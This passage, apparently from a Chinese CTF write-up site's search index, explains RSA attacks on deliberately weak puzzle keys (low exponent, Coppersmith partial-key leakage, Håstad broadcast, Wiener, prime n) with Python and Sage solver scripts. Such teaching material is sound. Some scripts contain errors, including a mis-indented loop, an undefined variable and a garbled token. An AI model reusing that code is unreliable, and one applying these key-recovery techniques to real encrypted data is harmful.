X * E - 11\n\n    print(f\"[*] \u5f00\u59cb\u679a\u4e3e r (r_max={R_MAX})...\")\n\n    # r \u5fc5\u987b\u4e3a\u6b63\u6574\u6570\n    for r in range(1, R_MAX + 1):\n        # \u516c\u5f0f\u5206\u6bcd D_DEN = 11*r + 7*E\n        D_DEN = 11 * r + 7 * E\n\n        # 1. \u6574\u9664\u6027\u68c0\u67e5\uff1a\u5224\u65ad\u5206\u5b50\u662f\u5426\u80fd\u88ab\u5206\u6bcd\u6574\u9664\n        if C_NUM % D_DEN == 0:\n\n            # \u627e\u5230\u6f5c\u5728\u7684 phi(n)\n            phi_n = C_NUM // D_DEN\n            print(f\"[+] \u627e\u5230\u6f5c\u5728\u7684 phi(n) \u5019\u9009\u9879 (r={r})\")\n\n            # 2. \u5408\u7406\u6027\u68c0\u67e5\uff1aphi(n) \u5fc5\u987b\u5c0f\u4e8e N\n            if phi_n &gt;= N:\n                # \u7406\u8bba\u4e0a\u4e0d\u53ef\u80fd\uff0c\u5982\u679c\u51fa\u73b0\u8bf4\u660e\u6570\u636e\u6709\u8bef\uff0c\u6216 r_max \u8bbe\u7f6e\u592a\u5c0f\n                continue\n\n            # 3. RSA \u7ea6\u675f\u68c0\u67e5\uff1a\u5224\u65ad phi(n) \u662f\u5426\u80fd\u7528\u4e8e\u5206\u89e3 N\n            # \u6211\u4eec\u77e5\u9053\uff1ap + q = N - phi(n) + 1\n            # \u8bbe S = p + q\n            S = N - phi_n + 1\n\n            # \u6839\u636e\u97e6\u8fbe\u5b9a\u7406\uff0cp, q \u662f\u4e8c\u6b21\u65b9\u7a0b X^2 - S*X + N = 0 \u7684\u6839\n            # \u5224\u522b\u5f0f D = S^2 - 4*N \u5fc5\u987b\u662f\u4e00\u4e2a\u5b8c\u5168\u5e73\u65b9\u6570 (Perfect Square)\n            D = S * S - 4 * N\n\n            # \u4f7f\u7528 gmpy2 \u68c0\u67e5 D \u662f\u5426\u4e3a\u5b8c\u5168\u5e73\u65b9\u6570\n            if gmpy2.is_square(D):\n                print(f\"[!!!] \u6210\u529f\u627e\u5230\u6b63\u786e\u7684 phi(n)!\")\n                print(f\"[!] r = {r}\")\n                print(f\"[!] phi(n) = {phi_n}\")\n\n                # 4. \u6700\u7ec8\u89e3\u5bc6\n\n                # \u8ba1\u7b97\u79c1\u94a5 d = E^(-1) mod phi(n)\n                d = inverse(E, phi_n)\n\n                # \u89e3\u5bc6\u660e\u6587 m = C^d mod N\n                m = pow(C, d, N)\n\n                flag = long_to_bytes(m)\n\n                print(\"\\n==============================================\")\n                print(f\"p + q = {S}\")\n                print(f\"Private Key d = {d}\")\n                print(f\"Decrypted Flag: {flag.decode()}\")\n                print(\"==============================================\")\n                return True  # \u9000\u51fa\u51fd\u6570\n\n    print(\"[-] \u672a\u80fd\u5728\u8bbe\u5b9a\u7684 R_MAX \u8303\u56f4\u5185\u627e\u5230\u6709\u6548\u7684 phi(n)\uff0c\u8bf7\u5c1d\u8bd5\u589e\u5927 R_MAX \u6216\u68c0\u67e5\u8f93\u5165\u6570\u636e\u3002\")\n    return False\n\n\nif __name__ == \"__main__\":\n    if N == ...:\n        print(\"\u9519\u8bef\uff1a\u8bf7\u5148\u5728\u811a\u672c\u9876\u90e8\u66ff\u6362 N, C, X \u7684\u5360\u4f4d\u7b26\uff01\")\n        sys.exit(1)\n\n    solve_modified_rsa(N, E, C, X, R_MAX)\n</code></pre>"},{"location":"Crypto/Chapter6/6-3/","title":"\u5728\u7ebf\u5206\u89e3 n","text":""},{"location":"Crypto/Chapter6/6-3/#\u5728\u7ebf\u5206\u89e3-n","title":"\u5728\u7ebf\u5206\u89e3 n","text":"<p>\u6253\u5f00\u6587\u4ef6\u7ed9\u4e86 n \u548c e</p> <p></p> <p>\u53bb\u7f51\u7ad9\u5206\u89e3\u5f97\u5230\u4e86 p\u3001q</p> <p></p> <p>\u9700\u8981\u7684\u4e1c\u897f\u9f50\u4e86\uff0c\u7f16\u5199\u811a\u672c\u8bfb\u53d6\u6bcf\u884c\u89e3\u5bc6\uff0c\u8bb0\u5f97\u5220\u9664 data.txt \u7684\u524d\u4e24\u884c</p> <pre><code>import gmpy2\n\n\nn = 920139713\n\ne = 19\n\n# p\u3001q \u5728\u7ebf\u7f51\u7ad9\u5206\u89e3\u5f97\u5230\np = 18443\n\nq = 49891\n\nphi = (p - 1) * (q - 1)\n\nd = gmpy2.invert(e, phi)\n\nresult = []\n\nwith open(\"../02c01a13-3a86-47de-8648-f03328a5e5d8/RsaRoll/data.txt\", \"r\") as f:\n    for line in f.readlines():\n    line = line.strip('\\n')\n\n    result.append(chr(pow(int(line), d, n)))\n\nfor i in result:\n    print(i, end='')\n</code></pre>"},{"location":"Crypto/Chapter6/6-4/","title":"n \u4e3a\u7d20\u6570\u63a8\u51fa phi","text":""},{"location":"Crypto/Chapter6/6-4/#n-\u4e3a\u7d20\u6570\u63a8\u51fa-phi","title":"n \u4e3a\u7d20\u6570\u63a8\u51fa phi","text":"<p>\u505a\u9898\u7684\u65f6\u5019\u7f51\u7ad9\u6302\u4e86\uff0c\u8fd9\u91cc\u9898\u76ee\u7ed9\u4e86 n e c\uff0c\u5176\u4e2d n \u662f\u7d20\u6570</p> <p>\u89e3\u9898\u601d\u8def\uff1a</p> <pre><code>\u6b27\u62c9\u51fd\u6570\u7684\u5b9a\u4e49\uff1a\u5bf9\u4e8e\u4e00\u4e2a\u6574\u6570 n\uff0cphi \u662f\u5c0f\u4e8e n \u7684\u6b63\u6574\u6570\u4e2d\u4e0e n \u4e92\u8d28\u7684\u4e2a\u6570\n</code></pre> <p>$$ \\begin{aligned} &amp;phi = (q - 1)(p - 1) \\end{aligned} $$ <pre><code>\u56e0\u4e3a\u5bf9\u4e8e q\u3001p\uff0c\u5c0f\u4e8e\u5b83\u4fe9\u7684\u6574\u6570\u5206\u522b\u4e0e\u4ed6\u4fe9\u4e92\u8d28\u7684\u6570\u662f p - 1 \u548c q -1\n\n\u5e76\u4e14\u5b83\u4eec\u4e4b\u95f4\u4e92\u8d28\uff0c\u6240\u4ee5\u76f8\u4e58\u5f97\u5230\u6574\u4e2a N \u7684\u4e92\u8d28\u6570\u4e2a\u6570\n\n\u5f53 n \u662f\u7d20\u6570\u65f6\uff0c\u6240\u6709\u5c0f\u4e8e n \u7684\u6b63\u6574\u6570\u90fd\u4e0e n \u4e92\u8d28\n\n\u6240\u4ee5\n</code></pre></p> <p>$$ \\begin{aligned} &amp;phi = n - 1 \\end{aligned} $$ <pre><code>import libnum\nfrom gmpy2 import *\n\n\n# \u9898\u76ee\u6761\u4ef6\nn = 894011376132861406416081994144221048298348543110763436400156707035479762291337096368301340210777912166253392435275663746074998964323198306974285233167719096055553347615918699581765041856450618725024365550285245909593290693757548300976025136185960841538482656726074757217987326418213368306947431668797511869941369363510575799319146232381645606378509284692783439527001482275434870365007864755014763434476875230779298152747668036103797086099448952638933614839186234115539057353208089196503236476069765055958643599622359809306429773621018079928117609961649006558217734057147235098517323614637509521563090769478823258676357262436290835475545437211168106617010859479612214627871047960151415095910992231687737019157788664429412462674876326653667300420128914036327499885103193423178025962079282185227746880809451234195481664650147610375976243181422075319601793906090392759832052648670731266344219250793991957964535801285606036631861341696305110038590888086491568683507575846576623827059055577036404611548224528600604898405714747157240730264673180051312634408192644777331633111950232485559076080686217541095754245034143596485147084607615402187454830802772582891800608645679493263524678084504132604846410243911260803002065871918398725293311473\n\ne = 49999\n\nc = 127990258916322713210704002931365496210647826869578493680557063836772515914303363145985391647430839311330158084206710072455465957218072448099969815961814463831667357474852426061475210363277306704257877402661232669936031043625938011115290529377505573367883714424182150449678726041360949463375982144652910707759221795772350872426009873120527309342093683340576731241704191541296890578962805029558926492259701366885936092059693759354255247540815813052543086204934376066884066060405947003334121725632674642690548675916126384013014552545338699198239765357561083183401525044638243204528501965028598782513999767237563252331767079569128151380305983732341553403814650118788711703476805307790685184506737890913441497269132749881622937761764492015610811577966553776703680435092016590690563200951474073620866158140866931856293211794418637441400021472249887178225738960768608549559781531479910409684884180658879621882231073123533851227894797415625533435081416099549459198508358607887551022339960981663266529984544362524495679204397590064106335341279871204905873532415276380340515150499389237587052633736125460704219829657692767592459700685070039056607335118481257774532132073976558433243315868939654221066341581052013795470559435542389710686098062\n\nd = invert(e, (n - 1))\n\nm = pow(c, d, n)\n\nprint(libnum.n2s(int(m)))\n</code></pre></p>"},{"location":"Crypto/Chapter6/6-5/","title":"\u4f4e\u52a0\u5bc6\u6307\u6570\u7206\u7834\u653b\u51fb\uff08e \u8f83\u5c0f\uff09","text":""},{"location":"Crypto/Chapter6/6-5/#\u4f4e\u52a0\u5bc6\u6307\u6570\u7206\u7834\u653b\u51fbe-\u8f83\u5c0f","title":"\u4f4e\u52a0\u5bc6\u6307\u6570\u7206\u7834\u653b\u51fb\uff08e \u8f83\u5c0f\uff09","text":"<p>\u9898\u76ee\u7ed9\u51fa\u4e86 n c e\uff08\u8f83\u5c0f\uff09\uff0c\u53ef\u4ee5\u7528\u4f4e\u52a0\u5bc6\u6307\u6570\u653b\u51fb\u53bb\u89e3\u9898</p> <p>$$ \\begin{aligned} &amp;\\because c = m ^ e mod n\\\\ First case:\\\\ &amp;\\because m ^ e &lt; n\\ &amp;\\therefore c = m ^ e\\\\ Example: \\\\ &amp;e = 3\\ &amp;n = 100\\ &amp;m = 4\\ &amp;m ^ e = 64\\ &amp;\\because 64 &lt; 100\\ &amp;\\therefore c = 64\\\\ Second case:\\\\ &amp;\\because m ^ e &gt; n\\ &amp;\\therefore m ^ e =kn + c\\\\ &amp;(k is a positive integer multiple) \\end{aligned} $$ <pre><code>from gmpy2 import iroot\nimport libnum\n\n\ne = 0x3\n\nn = 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793\n\nc = 0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365\n\nk = 0\n\nwhile 1:\n    # iroot: \u8ba1\u7b97 x \u5f00 e \u6b21\u65b9\u5e76\u8fd4\u56de\u4e00\u4e2a\u4e8c\u5143\u7ec4\n    # 1. root \u662f x \u7684 e \u6b21\u65b9\u6839\n    # 2. is_exact \u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a x \u662f\u5426\u6070\u597d\u662f\u67d0\u4e2a\u6570\u7684 e \u6b21\u65b9\n    # \u5982\u679c x \u6b63\u597d\u662f\u67d0\u4e2a\u6570\u7684 e \u6b21\u65b9\uff0c\u90a3\u4e48 is_exact \u4e3a True\uff0c\u5426\u5219\u4e3a False\n    res = iroot(c + k * n, e)\n\n    if res[1]:\n        print(libnum.n2s(int(res[0])))\n\n        break\n\n    k += 1\n</code></pre></p>"},{"location":"Crypto/Chapter6/6-6/","title":"\u4f4e\u52a0\u5bc6\u6307\u6570\u5206\u89e3\u653b\u51fb\uff08e \u8f83\u5c0f\uff09","text":""},{"location":"Crypto/Chapter6/6-6/#\u4f4e\u52a0\u5bc6\u6307\u6570\u5206\u89e3\u653b\u51fbe-\u8f83\u5c0f","title":"\u4f4e\u52a0\u5bc6\u6307\u6570\u5206\u89e3\u653b\u51fb\uff08e \u8f83\u5c0f\uff09","text":"<p>\u9898\u76ee\u7ed9\u51fa n\u3001c\uff0cc \u6bd4 n \u5c0f\uff0c\u63a8\u6d4b\u8981\u4f4e\u52a0\u5bc6\u6307\u6570\u653b\u51fb\uff0c\u6700\u540e\u53ef\u76f4\u63a5\u5206\u89e3 n \u5f97\u5230 p\u3001q</p> <p>$$ \\begin{aligned} &amp;\\because c = m ^ e mod n\\\\ First case:\\\\ &amp;\\because m ^ e &lt; n\\ &amp;\\therefore c = m ^ e\\\\ Example: \\\\ &amp;e = 3\\ &amp;n = 100\\ &amp;m = 4\\ &amp;m ^ e = 64\\ &amp;\\because 64 &lt; 100\\ &amp;\\therefore c = 64\\\\ Second case:\\\\ &amp;\\because m ^ e &gt; n\\ &amp;\\therefore m ^ e =kn + c\\\\ &amp;(k is a positive integer multiple) \\end{aligned} $$ </p>"},{"location":"Crypto/Chapter6/6-7/","title":"Coppersmith \u653b\u51fb\uff08p \u9ad8\u4f4d\u3001q \u4f4e\u4f4d\u6cc4\u9732\uff09","text":""},{"location":"Crypto/Chapter6/6-7/#coppersmith-\u653b\u51fbpq-\u90e8\u5206\u4f4d\u6570\u6cc4\u9732","title":"Coppersmith \u653b\u51fb\uff08p\u3001q \u90e8\u5206\u4f4d\u6570\u6cc4\u9732\uff09","text":"<p>from secret import flag</p> <p>p = getPrime(1024) q = getPrime(1024) n = p * q e = 65537 hint1 = p &gt;&gt; 724 hint2 = q % (2 ** 265) ct = pow(bytes_to_long(flag), e, n) print(hint1) print(hint2) print(n) print(ct)</p> <p>\"\"\" hint1 = 1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479 hint2 = 40812438243894343296354573724131194431453023461572200856406939246297219541329623 n = 21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969 ct = 19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188 \"\"\" <pre><code>$$\n\\begin{aligned}\n&amp;Let\\ \\ q0\\ =\\ q\\ mod\\ 2^{265}\\\\\n&amp;\\therefore\\ q\\ =\\ q0\\ +\\ 2^{265}k\\\\\n&amp;\\therefore\\ n = \\ q0\\ p\\ +\\ 2^{265}\\ k\\ p\\\\\n&amp;\\therefore\\ n\\ q0^{-1}\\ =\\ p\\ +\\ 2^{265}\\ k\\ p\\ q0^{-1}\\\\\\\\\n&amp;Let\\ \\ k\\ =\\ k\\ p\\ q0^{-1}\\\\\n&amp;\\therefore\\ n\\ q0^{-1}\\ =\\ p\\ +\\ 2^{265}k\\\\\n&amp;\\because\\ c\\ =\\ m ^ e\\ mod\\ n\\\\\n&amp;\\therefore\\ m ^ e\\ =kn\\ +\\ c\\\\\n&amp;\\therefore\\ p0\\ =\\ n\\ q0^{-1}\\ mod\\ 2^{265}\\\\\\\\\n&amp;(Here\\ p0\\ represents\\ the\\ lower\\ 265\\ bits\\ of\\ p)\n\\end{aligned}\n$$\n</code></pre> \u90a3\u4e48 p \u7684\u9ad8 300 \u4f4d\u548c\u4f4e 265 \u4f4d\u4e4b\u548c\u4e3a\uff1a</p> <p>(hint1 &lt;&lt; 724) + p0</p> <p>\u5176\u4e2d\u95f4\u7684 459 \u4f4d\u901a\u8fc7 copperSmith \u6c42\u89e3</p> <p>\u6b63\u5e38\u60c5\u51b5\u4e0b\u662f\u6784\u9020 f = pbar + x * 265\uff0c\u4f46\u662f\u56e0\u4e3a\u4f4d\u6570\u4e0d\u591f\u6240\u4ee5\u9700\u8981\u62ac\u9ad8 64 \u7206\u7834\uff08\u8981\u6c42\u5df2\u77e5\u4f4d\u6570 &gt;= 570bit\uff09</p> <p>\u6bcf\u6b21\u52a0 2 ^ 265</p> <p>sage \u6c42\u89e3\u7684\u56fa\u5b9a\u65b9\u5f0f\uff1a</p> <p>PR. = PolynomialRing(Zmod(n)) <p>f = ...</p> <p>f = f.monic()</p> <p>f.small_roots(X = 2 ^ (sizep-knownbits) - 1, beta = 0.4) <pre><code>```python\nhint1 = 1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479\n\nhint2 = 40812438243894343296354573724131194431453023461572200856406939246297219541329623\n\nn = 21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969\n\np0 = n * (hint2 ^ -1) % (2 ^ 265)\n\npbar = (hint1 &lt;&lt; 724) + p0\n\nPR.&lt;x&gt; = PolynomialRing(Zmod(n))\n\n# \u5faa\u73af\u7206\u7834\nfor i in range(64):\n    f = pbar + x * (2 ^ 265) * 64 + x * (2 ^ 265)\n\n    # f.monic()\uff1a\u5c06\u591a\u9879\u5f0f\u8f6c\u6362\u4e3a\u4e00\u4e2a\u5355\u9879\u5f0f\u5316\u591a\u9879\u5f0f\uff0c\u5176\u6700\u9ad8\u6b21\u9879\u7684\u7cfb\u6570\u4e3a 1\n    f = f.monic()\n\n    pp = f.small_roots(X = 2 ^ 453, beta = 0.4)\n\n    if pp:\n        break\n\n    pbar += 2 ^ 265\n\np = int(pbar + pp[0] * 32 * (2 ^ 265))\n\nprint(\"p=\", p)\n</code></pre></p> <p>\u53bb\u5728\u7ebf\u7f51\u7ad9\u89e3\u51fa p</p> <p></p>"},{"location":"Crypto/Chapter6/6-8/","title":"\u4f4e\u52a0\u5bc6\u6307\u6570\u5e7f\u64ad\u653b\u51fb\uff08n\u3001c \u4e3a\u5217\u8868 e \u8f83\u5c0f\uff09","text":""},{"location":"Crypto/Chapter6/6-8/#\u4f4e\u52a0\u5bc6\u6307\u6570\u5e7f\u64ad\u653b\u51fbnc-\u4e3a\u5217\u8868-e-\u8f83\u5c0f","title":"\u4f4e\u52a0\u5bc6\u6307\u6570\u5e7f\u64ad\u653b\u51fb\uff08n\u3001c \u4e3a\u5217\u8868 e \u8f83\u5c0f\uff09","text":"<p>from Crypto.Util.Padding import *</p> <p>FLAG = bytes_to_long(pad(b\"flag{??????}\",64)) def init_key():     p, q = getPrime(512), getPrime(512)     n = p*q     e = 9     while(GCD((p-1)(q-1),e)!=1):         p, q = getPrime(512), getPrime(512)         n = p*q     d = inverse(e,(p-1)(q-1))     return n,e,d</p> <p>n_list=list() c_list=list() for i in range(9):     N,e,d=init_key()     n_list.append(N)     c=pow(FLAG,e,N)     c_list.append(pow(FLAG,e,N))     assert(pow(c,d,N)==FLAG) print(\"n_list:\",n_list) print(\"c_list:\",c_list) <pre><code>**\u89e3\u9898\u601d\u8def\uff1a**\n</code></pre> \u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u662f\u4e00\u79cd\u6c42\u89e3\u540c\u4f59\u65b9\u7a0b\u7ec4\u7684\u7b97\u6cd5\uff0c\u5bf9\u4e8e\u7ed9\u5b9a\u7684\u540c\u4f59\u65b9\u7a0b\u7ec4\uff1a</p> <p>x \u2261 a1 mod m1 x \u2261 a2 mod m2 \u2026\u2026 x \u2261 a3 mod m3</p> <p>\u4e14\u5b83\u4eec\u4e24\u4e24\u4e92\u8d28\u5219\u5b58\u5728\u552f\u4e00\u7684\u89e3 x \u5728 [0,M) \u8303\u56f4\u5185\uff0c\u5176\u4e2d M \u662f\u6240\u6709\u6a21\u6570\u7684\u4e58\u79ef\uff1a</p> <p>M = m1 * m2 * \u2026\u2026 * mn</p> <p>\u5bf9\u4e8e\u6bcf\u4e2a\u6a21\u6570 Mi \u53ef\u8fd9\u4e48\u8ba1\u7b97\uff1a</p> <p>Mi = M / mi</p> <p>\u6c42\u89e3\u6bcf\u4e2a Mi \u7684\u6a21\u9006\u5143\uff1a</p> <p>Mi * Mi ^ -1 \u2261 1 mod mi <pre><code>\u7f16\u5199\u811a\u672c\uff1a\n\n```python\nfrom Crypto.Util.number import *\nimport gmpy2\n\nn_list= [71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799, 92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949, 100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919, 59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847, 66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147, 120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377, 72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281, 69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951, 76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581]\n\nc_list= [62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585, 46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900, 85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198, 14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656, 1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839, 2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981, 16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376, 31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996, 25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515]\n\ne = 9\n\ndef CRT(aList, mList):\n    # \u8ba1\u7b97\u6a21\u6570\u7684\u4e58\u79ef M\n    M = 1\n\n    for i in mList:\n        M = M * i\n\n    # \n    x = 0\n\n    for i in range(len(mList)):\n        # \u8ba1\u7b97 Mi = M / mi\n        Mi = M // mList[i]\n\n        # \u8ba1\u7b97 Mi \u5728\u6a21 mi \u4e0b\u7684\u9006\u5143\n        Mi_inverse = gmpy2.invert(Mi, mList[i]) \n\n        # \u7d2f\u52a0\n        x += aList[i] * Mi * Mi_inverse \n\n    x = x % M\n\n    return x\n\n\nm_e = CRT(c_list, n_list) \n\nm = gmpy2.iroot(m_e, e)[0] \n\nprint(long_to_bytes(m))\n</code></pre></p>"},{"location":"Crypto/Chapter6/6-9/","title":"\u7ef4\u7eb3\u653b\u51fb\uff08e \u8fc7\u5927\u6216\u8fc7\u5c0f\uff09","text":""},{"location":"Crypto/Chapter6/6-9/#\u7ef4\u7eb3\u653b\u51fbe-\u8fc7\u5927\u6216\u8fc7\u5c0f","title":"\u7ef4\u7eb3\u653b\u51fb\uff08e \u8fc7\u5927\u6216\u8fc7\u5c0f\uff09","text":"<p>from gmpy2 import * from libnum import *</p> <p>flag = b'DASCTF{******}'</p> <p>p = getPrime(512) q = getPrime(512) n = p*q d = getPrime(256) e = inverse(d, (p-1)*(q-1)) m = s2n(flag) c = pow(m, e, n)</p> <p>print('n = ' + str(n)) print('e = ' + str(e)) print('c = ' + str\u00a9)</p> <p>''' n = 114566998957451783636756389276471274690612644037126335470456866443567982817002189902938330449132444558501556339080521014838959058380963759366933946623103869574657553262938223064086322963492884606713973124514306815995276393344755433548846003574038937940253826360659447735554684257197194046341849089254659225497 e = 35489734227210930185586918984451799765619374486784192218215354633053183935617953856556709715097294481614236703293033675674496036691242573294182072757562322996800390363453350727372642264982749305833933966045097125311467413670410802534093354414115267442785896373815076066721029449240889291057288090241124904705 c = 60503455347700500866544596012233537789678841391057706123172519773588895502922586197178148979273264437566411675346207472455036341903878112074983509557751805365618433536738111588239911292341288514123006967218545943520736254346030465088445419278775539026233686559207400401082452551955780877227801939191694370380 ''' <pre><code>**\u5728 e \u8fc7\u5927\u6216\u8fc7\u5c0f\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4f7f\u7528\u7b97\u6cd5\u4ece e \u4e2d\u5feb\u901f\u63a8\u65ad\u51fa d \u7684\u503c\uff0c[\u539f\u6587\u94fe\u63a5](https://www.cnblogs.com/wandervogel/p/16805992.html)**\n$$\n\\begin{aligned}\n&amp;\\because\\ n\\ =\\ pq\\\\\n&amp;\\because\\ \\varphi(n)\\ =\\ (q\\ -\\ 1)(p\\ -\\ 1)\\\\\n&amp;\\therefore\\ \\varphi(n)\\ =\\ pq\\ -\\ (p\\ +\\ q)\\ +\\ 1\\\\\n&amp;\\therefore\\ \\varphi(n)\\ =\\ n\\ -\\ (p\\ +\\ q)\\ +\\ 1\\\\\\\\\n&amp;\\because\\ p,q\\ are\\ very\\ large\\\\\n&amp;\\therefore\\ pq\\ &gt;&gt;\\ p\\ +\\ q\\\\\n&amp;\\therefore\\ \\varphi(n)\\ \\approx\\ n\\\\\\\\\n&amp;\\because\\ ed\\ \\equiv\\ 1\\ mod\\ \\varphi(n)\\\\\\\\\n&amp;(This\\ ed\\ is\\ the\\ theorem.Don't\\ worry\\ about\\ it)\\\\\\\\\n&amp;\\therefore\\ ed\\ -\\ 1\\ =\\ k\\varphi(n)\\\\\n&amp;\\therefore\\ \\frac{e}{\\varphi(n)}\\ -\\ \\frac{1}{d\\varphi(n)}\\ =\\ \\frac{k}{d}\\\\\n&amp;\\therefore\\ \\frac{e}{\\varphi(n)}\\ -\\ \\frac{k}{d}\\ =\\ \\frac{1}{d\\varphi(n)}\\\\\\\\\n&amp;If\\ \\ \\frac{1}{d\\varphi(n)}\\ \\ is\\ very\\ small\\\\\n&amp;\\frac{e}{\\varphi(n)}\\ \\ and\\ \\ \\frac{k}{d}\\ \\ are\\ very\\ close\\\\\\\\\n&amp;\\because\\ \\varphi(n)\\ \\approx\\ n\\\\\n&amp;\\therefore\\ \\frac{e}{n}\\ -\\ \\frac{k}{d}\\ =\\ \\frac{1}{d\\varphi(n)}\n\\end{aligned}\n$$\n\n```python\nfrom RSAwienerHacker import hack_RSA\nimport libnum\n\n\nn = 114566998957451783636756389276471274690612644037126335470456866443567982817002189902938330449132444558501556339080521014838959058380963759366933946623103869574657553262938223064086322963492884606713973124514306815995276393344755433548846003574038937940253826360659447735554684257197194046341849089254659225497\ne = 35489734227210930185586918984451799765619374486784192218215354633053183935617953856556709715097294481614236703293033675674496036691242573294182072757562322996800390363453350727372642264982749305833933966045097125311467413670410802534093354414115267442785896373815076066721029449240889291057288090241124904705\nc = 60503455347700500866544596012233537789678841391057706123172519773588895502922586197178148979273264437566411675346207472455036341903878112074983509557751805365618433536738111588239911292341288514123006967218545943520736254346030465088445419278775539026233686559207400401082452551955780877227801939191694370380\n\nd=hack_RSA(e,n)\n\nprint(libnum.n2s(pow(enc ,d ,n)))\n</code></pre></p> <pre><code>import gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n\ndef transform(x, y):\n    \"\"\"\n    \u5c06\u5206\u6570 x/y \u8f6c\u4e3a\u8fde\u5206\u6570\u5f62\u5f0f\u3002\n    